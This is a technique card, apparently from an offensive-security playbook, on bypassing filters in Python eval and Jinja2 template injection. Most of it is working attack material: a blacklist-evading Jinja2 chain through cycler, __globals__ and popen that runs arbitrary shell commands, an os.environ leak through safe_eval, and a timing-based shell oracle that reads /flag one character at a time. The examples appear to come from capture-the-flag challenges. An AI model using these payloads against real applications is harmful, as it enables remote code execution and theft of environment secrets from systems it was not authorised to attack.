---
name: safe_eval_attribute_chain
vuln_type: ssti
sub_technique: attribute_chain_filter_bypass
category: exploitation
safety_level: safe
tags:
- eval
- ssti
- attribute-chain
- filter-bypass
---

# Safe Eval / Jinja2 Attribute Chain — Filter Bypass

## When to Apply

User input reaches a sink like eval() / safe_eval() / render_template_string(), and allowed_globals or the Jinja2 environment exposes os/__builtins__/__class__/__mro__. Even with BLACKLIST filters (`(`, `)`, `__`, `os`, `import`, etc.), bypass is possible via attribute access (`a.b.c`), Jinja2 `attr()` filter, `~` string concat, or standard dict access.

## Prerequisites

- Input reaches a sink that allows attribute access (`a.b`) expressions
- Result is exposed in response body/error/debug or side-effects (file read, OOB) are possible
- Filter bypass: if '(' is blocked, use dict comprehension or standard data access (`os.environ`, `request.application.__globals__`)
- For Jinja2: `cycler|attr('_'~'_'~'init'~'_'~'_')|attr('_'~'_'~'globals'~'_'~'_')` style chain

## Steps

1. Identify sink: `eval(value)`, `safe_eval(value)`, `{{ value }}` (Jinja2 SSTI)
2. Map allowed_globals/builtins/class chain:
   - Python eval: `os.environ` (simplest), `__builtins__.eval`, `().__class__.__mro__[1].__subclasses__()`
   - Jinja2: `cycler|attr('__init__')|attr('__globals__')|...` or `config.from_object`, `request.application.__globals__`
3. Filter bypass: if '(' is forbidden, use dict access — `os.environ` is a dict so no call needed
4. Output: extract from response body debug/error/template render result

## Code Template

```
# Python eval/safe_eval
payload = {expr}  # e.g.: 'os.environ'

# Jinja2 SSTI BLACKLIST bypass
payload = '{{ cycler|attr("_~_~init~_~_".replace("~",""))'
          '|attr("_~_~globals~_~_".replace("~",""))'
          '|attr("get")("o~s".replace("~",""))'
          '|attr("po~pen".replace("~",""))("<cmd>")'
          '|attr("re~ad".replace("~",""))() }}'
```

## Examples

### Example 1

- **sink**: safe_eval (Python)
- **expr**: os.environ
- **filter_bypassed**: `["( blocked", ") blocked", "domain regex must pass"]`
- **output_path**: TRACE /verify response debug field

ImageDescription tag → safe_eval → dict(os.environ) → FLAG env leaked

### Example 2

- **sink**: Jinja2 render_template_string
- **expr**: cycler|attr('_'~'_'~'init'~'_'~'_')|attr(...)|attr('po'~'pen')
- **bypass_chars**: ~ (concat, + blocked), attr() (. [] blocked), 'o'~'s' (os blocked)
- **filter_bypassed**: `["BLACKLIST: __ . [ ] + request config os subprocess import init globals open read mro class"]`
- **output_path**: bash `case $(cat /flag|cut -c N) in C) sleep 4 ;; esac` → POST /write response time (selenium bot blocks until /article load)
- **verified_signal**: baseline 2.45s, sleep trigger 5.37s, threshold 4.85s

OOB not possible (iptables outgoing DROP). Transferability proven — Python eval pattern applies directly as a Jinja2 SSTI variant.
